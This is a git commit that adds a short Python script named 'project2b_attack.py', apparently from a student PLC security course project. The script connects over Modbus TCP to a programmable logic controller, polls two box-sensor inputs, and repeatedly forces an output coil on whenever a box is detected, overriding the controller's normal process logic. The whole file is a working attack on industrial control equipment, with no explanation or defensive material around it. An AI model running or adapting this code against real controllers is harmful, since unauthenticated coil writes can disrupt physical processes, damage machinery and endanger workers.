e51db5100838be8cc2d92f40f19b4b856ac1f430
Audrey Long <cheesemuffinish@gmail.com>
2021-11-14 14:03:17 -0800

    Add files via upload

---
+++ PLC-Project/Proj2B-aulong/project2b_attack.py
@@ -0,0 +1,17 @@
+import time
+from pymodbus.client.sync import ModbusTcpClient as ModbusClient
+client = ModbusClient('192.168.1.19', port=502)
+client.connect()
+UNIT = 0x1
+# rr = client.read_coils(0, 2, unit=UNIT)
+# box_at_sensor=not rr.bits[0]
+while True:
+	rr=client.read_discrete_inputs(0,2,unit=UNIT)
+	box_at_sensorA = not rr.bits[0]
+	box_at_sensorB = not rr.bits[1]
+	if box_at_sensorA:
+		client.write_coil(0, True,unit=UNIT)
+	if box_at_sensorB:
+		client.write_coil(0, True,unit=UNIT)
+	time.sleep(.1)
+
